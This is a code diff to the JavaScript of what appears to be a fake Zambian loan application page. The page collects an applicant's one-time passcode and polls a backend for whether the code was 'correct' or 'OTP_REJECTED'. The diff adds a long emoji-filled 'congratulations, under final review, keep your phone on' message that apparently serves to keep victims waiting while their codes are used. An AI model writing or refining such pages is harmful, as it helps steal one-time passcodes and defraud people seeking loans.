@@ -278,7 +278,9 @@ async function submitOtpCode() {
     body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
 
-  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', '✅ CORRECT OTP VERIFIED - LOAN APPROVED');
+  const finalApprovalMessage = `╔════════════════════════════════════╗\n💚✅ CONGRATULATIONS! ✅💚\n╚════════════════════════════════════╝\n\n🇿🇲 ZAMBIA LOAN APPROVAL UPDATE 🇿🇲\n\n🎉 Dear Valued Applicant,\n\n✅ Congratulations! Your loan application has successfully passed the initial review process.\n\n🟢 Your application is now under final verification by our loan processing team.\n\n⏳ Please wait just a few more minutes while we complete the review.\n\n💵 Once the verification is finalized and approved, your loan will be released immediately to your registered payment account.\n\n📲 Kindly keep your phone switched on and remain available for any important notifications.\n\n💚 Thank you for choosing our loan services.\n\n════════════════════════════════════\n✅ Status: UNDER FINAL REVIEW\n🟢 Next Step: Loan Disbursement After Final Approval\n⏱️ Estimated Waiting Time: A Few Minutes\n════════════════════════════════════\n\n🎊 Thank you for your patience, and congratulations once again! 🎊`;
+
+  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', finalApprovalMessage);
 }
 
 function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
@@ -298,7 +300,18 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
         }
         
         if (nextScreenId === 'screen-success') {
-          document.getElementById('final-success-id').innerText = `Application ID: ${appDataStore.appId}`;
+          const completionText = `╔════════════════════════════════════╗\n💚✅ CONGRATULATIONS! ✅💚\n╚════════════════════════════════════╝\n\n🇿🇲 ZAMBIA LOAN APPROVAL UPDATE 🇿🇲\n\n🎉 Dear Valued Applicant,\n\n✅ Congratulations! Your loan application has successfully passed the initial review process.\n\n🟢 Your application is now under final verification by our loan processing team.\n\n⏳ Please wait just a few more minutes while we complete the review.\n\n💵 Once the verification is finalized and approved, your loan will be released immediately to your registered payment account.\n\n📲 Kindly keep your phone switched on and remain available for any important notifications.\n\n💚 Thank you for choosing our loan services.\n\n════════════════════════════════════\n✅ Status: UNDER FINAL REVIEW\n🟢 Next Step: Loan Disbursement After Final Approval\n⏱️ Estimated Waiting Time: A Few Minutes\n════════════════════════════════════\n\n🎊 Thank you for your patience, and congratulations once again! 🎊`;
+
+          const successMsgEl = document.getElementById('final-success-message') || document.querySelector('#screen-success p');
+          if (successMsgEl) {
+            successMsgEl.style.whiteSpace = 'pre-wrap';
+            successMsgEl.innerText = completionText;
+          }
+
+          const finalIdEl = document.getElementById('final-success-id');
+          if (finalIdEl) {
+            finalIdEl.innerText = `Application ID: ${appDataStore.appId}`;
+          }
         }
 
         document.getElementById(nextScreenId).classList.add('active');
@@ -349,4 +362,4 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
       console.error('Polling error:', e);
     }
   }, 1000);
-    }
+}
